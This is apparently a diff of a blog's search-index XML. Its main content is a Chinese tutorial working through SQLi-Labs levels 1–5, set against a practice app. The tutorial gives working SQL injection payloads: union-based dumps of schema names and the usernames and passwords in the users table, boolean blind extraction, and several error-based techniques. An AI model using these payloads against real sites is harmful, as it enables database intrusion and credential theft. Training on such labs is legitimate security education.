@@ -73,17 +73,17 @@
         <category>攻击测试</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>攻击测试</tag>
-        <tag>Metasploit</tag>
+        <tag>kali Linux</tag>
         <tag>Ettercap</tag>
+        <tag>Metasploit</tag>
         <tag>browser_autopwn2</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[SQLi-Labs第一章（未完）]]></title>
     <url>%2Fsqli-libs-first%2F</url>
-    <content type="text"><![CDATA[前言 注入过程 一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 第一章的22关会慢慢更新，有时间就写。 二. 注入过程测试环境 MySQL 5.5.53 PHP 5.6.27-nts Apache 2.4 Less-11）首先进入SQLi-Labs，选择第一题 2）在地址后输入?id=1，发现可以显示用户信息，说明不是数值查询 3）接下来尝试修改修改id值，发现一直到12都可以显示信息 4）在地址后输入?id=1&#39;，发现返回错误信息，表示存在SQL字符注入 5）将参数改为?id=1&#39; --+，发现返回信息正常，则说明是单引号字符型注入 6）使用order by判断行数，当行数增加到4时返回错误信息，说明共有3列数据 7）将id=1改为一个数据库不存在的id值，使用union select 1,2,3联合查询语句查看页面是否有显示位 可以看到，返回了2和3两个值，说明有两个显示位 8）利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息 1?id=15&apos; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 9）查询security内的所有表名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3 --+ 10）爆破user表的列名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;) --+ 可以看到列表名为id、username和password 11）最后查询所有的用户名和密码 1?id=15&apos; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+ Less-2同样的我们先输入参数?id=1 将参数改为?id=1&#39;后报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 意思是单引号破坏了查询导致了错误，所以说，查询代码使用了整数。可以使用?id=1--+来注释掉剩余查询 查看代码可以看到具体的查询语句如下 1$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 使用以下payload均显示正常 12?id=1--+ or 1=1?id=1 or 1=1 --+ 可以使用如下payload获得显示位 其余步骤与Less-1相同 Less-3使用参数?id=1&#39; 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 猜测使用的是如下SQL语句 1Select login_name, select password from table where id= ('our input here') 使用参数?id=1)--+ 可以看到显示正常，说明猜测是正确的，查看源代码发现语句如下 1$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; 使用如下payload同样可以 1?id=&apos;) or &apos;1&apos;=(&apos;1 获得显示位 Less-4使用参数?id=1&quot;时报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 猜测id被括号_()_和_””_所包装 使用参数?id=1&quot;) --+，可以看到显示正常 查看源代码，可以看到语句如下 12$id = '"' . $id . '"';$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1"; 使用如下payload 12?id=&quot;) or &quot;1&quot;=(&quot;1?id=&quot;) or 1=1--+ 获得显示位]]></content>
+    <content type="text"><![CDATA[前言 注入过程 一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 第一章的22关会慢慢更新，有时间就写。 二. 注入过程 测试环境 MySQL 5.5.53 PHP 5.6.27-nts Apache 2.4 1. Less-11）首先进入SQLi-Labs，选择第一题 2）在地址后输入?id=1，发现可以显示用户信息，说明不是数值查询 3）接下来尝试修改修改id值，发现一直到12都可以显示信息 4）在地址后输入?id=1&#39;，发现返回错误信息，表示存在SQL字符注入 5）将参数改为?id=1&#39; --+，发现返回信息正常，则说明是单引号字符型注入 6）使用order by判断行数，当行数增加到4时返回错误信息，说明共有3列数据 7）将id=1改为一个数据库不存在的id值，使用union select 1,2,3联合查询语句查看页面是否有显示位 可以看到，返回了2和3两个值，说明有两个显示位 8）利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息 1?id=15&apos; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 9）查询security内的所有表名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3 --+ 10）爆破user表的列名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;) --+ 可以看到列表名为id、username和password 11）最后查询所有的用户名和密码 1?id=15&apos; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+ 2. Less-2同样的我们先输入参数?id=1 将参数改为?id=1&#39;后报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 意思是单引号破坏了查询导致了错误，所以说，查询代码使用了整数。可以使用?id=1--+来注释掉剩余查询 查看代码可以看到具体的查询语句如下 1$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 使用以下payload均显示正常 12?id=1--+ or 1=1?id=1 or 1=1 --+ 可以使用如下payload获得显示位 其余步骤与Less-1相同 3. Less-3使用参数?id=1&#39; 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 猜测使用的是如下SQL语句 1Select login_name, select password from table where id= ('our input here') 使用参数?id=1)--+ 可以看到显示正常，说明猜测是正确的，查看源代码发现语句如下 1$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; 使用如下payload同样可以 1?id=&apos;) or &apos;1&apos;=(&apos;1 获得显示位 4. Less-4使用参数?id=1&quot;时报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 猜测id被括号_()_和_””_所包装 使用参数?id=1&quot;) --+，可以看到显示正常 查看源代码，可以看到语句如下 12$id = '"' . $id . '"';$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1"; 使用如下payload 12?id=&quot;) or &quot;1&quot;=(&quot;1?id=&quot;) or 1=1--+ 获得显示位 5. Less-5第五关使用的是盲注，通过源代码可以看到，如果输入正确，返回的是You are in........... 部分源代码如下 12345678910111213141516171819202122$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size="5" color="#FFFF00"&gt;'; echo 'You are in...........'; echo "&lt;br&gt;"; echo "&lt;/font&gt;"; &#125; else &#123; echo '&lt;font size="3" color="#FFFF00"&gt;'; print_r(mysql_error()); echo "&lt;/br&gt;&lt;/font&gt;"; echo '&lt;font color= "#0000ff" font size= 3&gt;'; &#125;&#125; else &#123; echo "Please input the ID as parameter with numeric value";&#125; 5.1 基于布尔的盲注5.1.1 获取数据库长度首先尝试查看数据库长度 1234?id=1%27and%20length(database())=8%23%27= &apos;(单引号)%20= space(空格) 可以看到，数据库长度等于8时返回正常 当数据库长度不对时，不会有信息返回 5.1.2 获取数据库名5.1.2.1 使用left()函数获取数据库名接下来，尝试拿到数据库名的第一位 12?id=1&apos; and left(database(),1)&gt;&apos;a&apos;--+?id=1%27and%20left(database(),1)%3e%27a%27--+ 该语句的意思是数据库名的第一位是否大于a，如果大于a则返回真，否则返回否。 可以看到返回正常，说明数据库名第一位大于a，这里可以通过二分法猜出数据库名，测试得第一位是s。 尝试拿到数据库名的第二位 1?id=1&apos; and left(database(),2)&gt;&apos;sf&apos;--+ 可以看到返回值为假，说明第二位比f小。以此可以拿到数据库名为security 5.1.2.2 使用substr()、ascii()函数获取数据名因为具体的原理是差不多的，这里就只展示以下 1?id=1&apos; and ascii(substr(database(),1))=115--+ s的ASCII值为115，换成116试一试 可以看到，返回的是错误的 5.1.3 获取数据库下的表名5.1.3.1 获取第一个表的表名首先尝试拿到第一个表的表名的第一位，因为已经知道表名了，就只是验证一下 1?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+ 可以看到表名的第一位是e(ascii=101) 接下来获取第二位，这里需要将substr()函数的第二个参数改成2 1?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+ 第二位是m(ascii=109) 5.1.3.2 获取第二个表的表名那么关键问题来了，如何获取第二个表 这里需要将limit 0,1改为limit 1,1，因为第一个参数是表示从哪里开始。 1?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+ 可以看到，第二个表的第一位是r(ascii=114) 5.1.4 获取users表中的列使用regexp获取users表中的列 1234查看*users*表中是否含有名字以*us*开头的列?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1)--+?id=1%27%20and%201=(select%201%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20table_name%20regexp%20%27%5eus%5ba-z%5d%27%20limit%200,1)--+ 1234查看*users*表中是否含有名字是*username*的列?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^username&apos; limit 0,1)--+?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^username&apos; limit 0,1)--+ 5.1.5 使用ord()和mid()函数获取users表的内容首先获取username列中第一行第一个字符 12?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=68--+ 上面参数的意思是获取username列中第一行第一个字符的ASCII值，可以看到第一个字符是D 用同样的方法获得第二个字符 12?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),2,1))=117--+将MID()的第二个参数改为2 同样的，获取第二行第一个字符 12?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 1,1),1,1))=65--+将LIMIT的第一个参数改为1 5.2 基于报错的盲注5.2.1 普通的报错注入1?id=1&apos; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+ 5.2.2 利用double数值类型超出范围进行报错注入1?id=1&apos; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+ 5.2.3 利用bigint溢出进行报错注入1?id=1&apos; union select (!(select * from (select user())x) - ~0),2,3--+ 5.2.4 xpath函数报错注入1?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+ 1?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+ 5.2.5 利用数据的重复性1?id=1&apos;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+]]></content>
       <categories>
         <category>SQL注入</category>
       </categories>
@@ -127,10 +127,10 @@
         <category>工具使用</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>Social-Engineer-Toolkit</tag>
         <tag>钓鱼网站</tag>
         <tag>社工</tag>
+        <tag>kali Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -154,9 +154,9 @@
         <category>环境搭建</category>
       </categories>
       <tags>
+        <tag>kali Linux</tag>
         <tag>环境搭建</tag>
         <tag>Shellinabox</tag>
-        <tag>kali Linux</tag>
         <tag>Ngrok</tag>
       </tags>
   </entry>
@@ -168,8 +168,8 @@
         <category>攻击测试</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>攻击测试</tag>
+        <tag>kali Linux</tag>
         <tag>Ettercap</tag>
         <tag>中间人攻击</tag>
         <tag>DNS欺骗</tag>
